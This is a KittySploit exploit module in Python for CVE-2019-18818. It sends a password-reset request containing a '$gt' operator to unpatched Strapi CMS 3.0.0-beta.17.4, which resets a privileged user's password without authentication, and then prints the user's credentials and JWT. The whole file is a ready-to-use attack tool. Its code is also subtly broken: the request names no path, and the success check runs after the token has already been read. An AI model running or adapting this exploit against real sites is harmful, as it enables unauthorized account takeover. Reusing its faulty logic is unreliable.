from kittysploit import *
from lib.protocols.http.http_client import Http_client
import json

class Module(Auxiliary, Http_client):

	__info__ = {
		"name": "Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated)",
		"description": "This exploit module abuses the mishandling of password reset in JSON "\
      					"for Strapi CMS version 3.0.0-beta.17.4 to change the password of a privileged user.",
		"author": "KittySploit Team",
		"cve": "2019-18818",
		"targets": ["Strapi 3.0.0-beta-17.4"]
	}

	password = OptString("pwned", "New password to set", "yes")

	def check(self):
	
		print_status("Checking strapi cms version...")
		r = self.http_request(
							method="GET",
							path="/admin/init")
		ver = json.loads(r.text)
		ver = ver["data"]["strapiVersion"]
		if ver == "3.0.0-beta.17.4":
			Vulnerable.SUCCESS()
			return True
		else:
			fail.NotVulnerable()
			return False

	def run(self):
		data = {"code" : {"$gt":0},
			"password" : self.password,
			"passwordConfirmation" : self.password
			}
		
		r = self.http_request(
						method="POST",
						json=data,
						session=True)
		resp = json.loads(r.text)
		jwt = resp["jwt"]
		username = resp["user"]["username"]
		email = resp["user"]["email"]
		if "jwt" not in r:
			fail.NotVulnerable()
			return False
		else:
			print_success("Password reset successfully")
			print_status(f"Your email is: {email}")
			print_status(f"Your new credentials are: {username}:{self.password}")
			print_status(f"Your authenticated JSON Web Token: {jwt}")
			Vulnerable.SUCCESS()
			return True